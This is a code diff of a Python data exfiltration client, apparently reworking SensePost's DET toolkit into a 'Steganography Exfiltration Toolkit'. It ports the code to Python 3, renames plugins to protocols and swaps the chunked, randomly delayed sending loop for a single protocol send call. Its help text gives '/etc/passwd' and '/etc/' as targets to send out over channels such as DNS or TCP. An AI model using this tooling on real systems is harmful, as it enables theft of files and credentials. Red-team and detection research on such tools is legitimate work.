@@ -5,14 +5,12 @@ import json
 import os
 import random
 import signal
-import string
 import sys
 import tempfile
 import threading
 import time
 from os import listdir
 from os.path import isfile, join
-from random import randint
 from zlib import compress
 
 KEY = ""
@@ -34,7 +32,7 @@ class Colors:
 
 
 def display_message(message):
-    print "[%s] %s" % (time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()), message)
+    print("[%s] %s" % (time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()), message))
 
 
 def warning(message):
@@ -50,9 +48,9 @@ def info(message):
 
 
 # Do a md5sum of the file
-def md5(fname):
+def md5(file_name):
     hash_function = hashlib.md5()
-    with open(fname) as f:
+    with open(file_name) as f:
         for chunk in iter(lambda: f.read(4096), ""):
             hash_function.update(chunk)
     return hash_function.hexdigest()
@@ -69,39 +67,34 @@ function_mapping = {
 class Exfiltration(object):
     def __init__(self, results):
         self.plugin_manager = None
-        self.plugin = {}
+        self.protocol = {}
         self.results = results
 
         path = "protocols/"
         plugin = {}
 
-        # Load plugins
         sys.path.insert(0, path)
         for f in os.listdir(path):
-            fname, ext = os.path.splitext(f)
-            if ext == '.py' and self.should_use_plugin(fname):
-                mod = __import__(fname)
-                plugin[fname] = mod.Plugin(self, config["protocols"][fname])
-                self.plugin['config'] = config["protocols"][fname]
+            file_name, ext = os.path.splitext(f)
+            if ext == '.py' and self.should_use_protocol(file_name):
+                mod = __import__(file_name)
+                plugin[file_name] = mod.Protocol(self, config["protocols"][file_name])
                 break
 
-    def should_use_plugin(self, plugin_name):
-        # if the plugin has been specified specifically (-p twitter)
-        if self.results.plugin and plugin_name in self.results.plugin.split(','):
+    def should_use_protocol(self, protocol_name):
+        if self.results.protocol and protocol_name in self.results.protocol.split(','):
             return True
         else:
             return False
 
-    def register_plugin(self, transport_method, functions):
-        self.plugin[transport_method] = functions
+    def register_protocol(self, transport_method, functions):
+        self.protocol[transport_method] = functions
 
-    def get_plugin(self):
-        plugin_name = random.sample(self.plugin, 1)[0]
-        plugin_config = self.plugin['config']
-        return plugin_name, plugin_config, self.plugin[plugin_name]['send']
+    def get_protocol(self):
+        protocol_name = random.sample(self.protocol, 1)[0]
+        return protocol_name, self.protocol[protocol_name]['send']
 
-    @staticmethod
-    def log_message(mode, message):
+    def log_message(self, mode, message):
         if mode in function_mapping:
             function_mapping[mode](message)
 
@@ -111,24 +104,14 @@ class ExfiltrateFile(threading.Thread):
         threading.Thread.__init__(self)
         self.file_to_send = file_to_send
         self.exfiltrate = exfiltrate
-        self.jobid = ''.join(random.sample(
-            string.ascii_letters + string.digits, 7))
+        self.jobid = random.randint(200, 6000)
         self.checksum = md5(file_to_send)
         self.daemon = True
 
     def run(self):
         # registering packet
-        plugin_name, plugin_config, plugin_send_function = self.exfiltrate.get_plugin()
-        ok("Using {0} as transport method".format(plugin_name))
-
-        warning("[!] Registering packet for the file")
-        data = "%s|!|%s|!|REGISTER|!|%s" % (
-            self.jobid, os.path.basename(self.file_to_send), self.checksum)
-        plugin_send_function(data)
-
-        time_to_sleep = randint(1, MAX_TIME_SLEEP)
-        info("Sleeping for %s seconds" % time_to_sleep)
-        time.sleep(time_to_sleep)
+        protocol_name, protocol_send_function = self.exfiltrate.get_protocol()
+        ok("Using {0} as transport method".format(protocol_name))
 
         # sending the data
         f = tempfile.SpooledTemporaryFile()
@@ -140,56 +123,34 @@ class ExfiltrateFile(threading.Thread):
         f.seek(0)
         e.close()
 
-        packet_index = 0
-        while True:
-            data_file = f.read(NUM_BYTES_TO_READ).encode('hex')
-            if not data_file:
-                break
-            plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
-            ok("Using {0} as transport method".format(plugin_name))
-            # info("Sending %s bytes packet" % len(data_file))
-
-            data = "%s|!|%s|!|%s" % (self.jobid, packet_index, data_file)
-            plugin_send_function(data)
-            packet_index += 1
-
-            time_to_sleep = randint(1, MAX_TIME_SLEEP)
-            display_message("Sleeping for %s seconds" % time_to_sleep)
-            time.sleep(time_to_sleep)
-
-        # last packet
-        plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
-        ok("Using {0} as transport method".format(plugin_name))
-        data = "%s|!|%s|!|DONE" % (self.jobid, packet_index)
-        plugin_send_function(data)
+        protocol_send_function(self, f)
         f.close()
         sys.exit(0)
 
 
-def signal_handler(bla, frame):
+def signal_handler():
     global threads
     warning('Killing DET and its subprocesses')
     os.kill(os.getpid(), signal.SIGKILL)
 
 
 def main():
-    global MAX_TIME_SLEEP, MIN_TIME_SLEEP, KEY, NUM_BYTES_TO_READ, COMPRESSION
-    global threads, config
+    global COMPRESSION, threads, config
 
     parser = argparse.ArgumentParser(
-        description='Data Exfiltration Toolkit (SensePost)')
+        description='Steganography Exfiltration Toolkit')
     parser.add_argument('-c', action="store", dest="config", default=None,
-                        help="Configuration file (eg. '-c ./config-sample.json')")
+                        help="Configuration file (eg. '-c ./config.json')")
     parser.add_argument('-f', action="store", dest="file",
                         help="File to exfiltrate (eg. '-f /etc/passwd')")
     parser.add_argument('-d', action="store", dest="folder",
                         help="Folder to exfiltrate (eg. '-d /etc/')")
-    parser.add_argument('-p', action="store", dest="plugin",
-                        default=None, help="Plugins to use (eg. '-p dns,twitter')")
+    parser.add_argument('-p', action="store", dest="protocol",
+                        default=None, help="Protocol to use (eg. '-p tcp')")
     results = parser.parse_args()
 
     if results.config is None:
-        print "Specify a configuration file!"
+        print("Specify a configuration file!")
         parser.print_help()
         sys.exit(-1)
 
@@ -200,11 +161,6 @@ def main():
     signal.signal(signal.SIGINT, signal_handler)
     ok("CTRL+C to kill client")
 
-    MIN_TIME_SLEEP = int(config['min_sleep_time'])
-    MAX_TIME_SLEEP = int(config['max_sleep_time'])
-    # MIN_BYTES_READ = int(config['min_bytes_read'])
-    # MAX_BYTES_READ = int(config['max_bytes_read'])
-    # KEY = config['AES_KEY']
     COMPRESSION = bool(config['compression'])
     app = Exfiltration(results)
 
